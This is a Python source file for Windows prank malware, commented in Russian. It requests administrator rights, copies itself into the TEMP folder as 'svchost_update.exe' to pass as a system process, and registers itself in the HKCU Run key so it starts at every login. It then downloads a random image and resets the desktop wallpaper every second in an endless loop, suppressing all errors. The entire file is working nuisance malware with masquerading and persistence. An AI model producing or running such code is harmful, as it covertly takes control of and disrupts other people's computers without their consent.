import os
import sys
import time
import ctypes
import random
import urllib.request
import winreg

# ==========================================
# ЧАСТЬ 1: ПРОВЕРКА ПРАВ И УСТАНОВКА
# ==========================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

# ==========================================
# ЧАСТЬ 2: АВТОЗАГРУЗКА (PERSISTENCE)
# ==========================================

def establish_persistence():
    try:
        # Копируемся в папку Temp
        temp_dir = os.getenv("TEMP")
        new_path = os.path.join(temp_dir, "svchost_update.exe")
        if sys.executable != new_path:
            import shutil
            shutil.copy2(sys.executable, new_path)
            
        # Прописываем в реестр
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WallpaperTroll", 0, winreg.REG_SZ, new_path)
        winreg.CloseKey(key)
    except:
        pass

# ==========================================
# ЧАСТЬ 3: СМЕНА ОБОЕВ (ТРОЛЛИНГ)
# ==========================================

def change_wallpaper():
    # Список случайных картинок (или можно генерировать локально)
    # Используем сервис picsum.photos для случайных картинок
    url = "https://picsum.photos/1920/1080?random=" + str(random.randint(1, 10000))
    wallpaper_path = os.getenv("TEMP") + "\\wallpaper.jpg"
    
    try:
        # Скачиваем картинку
        urllib.request.urlretrieve(url, wallpaper_path)
        
        # Меняем обои через системный API
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
    except:
        pass

# ==========================================
# ЧАСТЬ 4: ГЛАВНЫЙ ЦИКЛ
# ==========================================

def main():
    if not is_admin():
        run_as_admin()
        return

    # Устанавливаем автозагрузку
    establish_persistence()

    # Бесконечный цикл смены обоев
    while True:
        try:
            change_wallpaper()
            time.sleep(1) # Меняем каждую секунду
        except:
            pass

if __name__ == "__main__":
    main()
